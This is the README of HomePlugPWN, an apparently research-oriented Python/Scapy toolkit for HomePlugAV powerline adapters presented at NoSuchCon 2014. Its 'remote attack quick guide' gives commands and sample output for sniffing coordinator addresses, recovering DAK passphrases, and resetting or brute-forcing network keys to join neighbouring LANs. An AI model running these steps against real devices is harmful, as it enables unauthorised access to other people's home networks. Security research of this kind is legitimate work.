HomePlugPWN
===========

HomePlugAV PLC tools presented at NoSuchCon 2014: http://www.nosuchcon.org/talks/2014/D1\_03\_Sebastien\_Dudek\_HomePlugAV\_PLC.pdf

## Requirements 
- Python >= 2.6
- Scapy 2.x
- Promiscous mode for Sniff Indicate packets

## Tools

- HomeplugAV.py scapy Layer: create and craft your own HomePlugAV packets
- discover.py: sends 'GetDeviceTypeRequest' in broadcast to discover PLCs of the same AVLN
- genDAK.py: derives MAC address to get a Qualcomm DAK passhrase
- PBKDF1.py: hashes the DAK or NMK passhrase using the PBKDF1
- quickKODAK.py: performs a KODAK bruteforce on powerline
- plcmon.py: enables 'Sniffer mode' and uses Sniffer Indicate packet to retrieve CCos MAC address

## Efficient remote attack quick guide

First we plug our device to the powerline and sniff for every possible CCo:

```bash
python plcmon.py 
[+] Enabling sniff mode
Sent 1 packets.
[+] Listening for CCo station...
	 Found CCo: 44:94:fc:56:ff:34 (DAK: RMHT-ILPO-TYMN-IIXY)
         [...]
```

The tool recovers also the DAK passphrase directly. 

Too change the NMK of the CCos to have a chance to connect to neighbor(s) LAN, we can send the SetEncryptionKeyRequest to the CCos:

```bash
python quickKODAK.py -i eth0 -t 4494fc56ff34
Sent 1 packets.
``` 

If you want to reconfigure all device, skip 2-3 of the MAC address found previously as follows:

```bash
python quickKODAK.py -i eth0 -t 4494fc56
Sent 1 packets.
```

This will bruteforce the 2 last bytes, generating a new DAK and sending it in broadcast for every combinaison.

## Licence

HomePlugPWN tools including the HomePlugAV scapy Layer are under the **GPLv2**

## Problems?

- Give us your feedback ;)

## Acknowledgements

* Xavier Carcelle for his book (Power Line Communications in Practice), and his Framework FAIFA
* Ben Tasker for finding CCos MAC addresses in Sniff Indicate packets
* Open-PLC-Utils : https://github.com/qca/open-plc-utils
* Netgear and TP-Link utilities
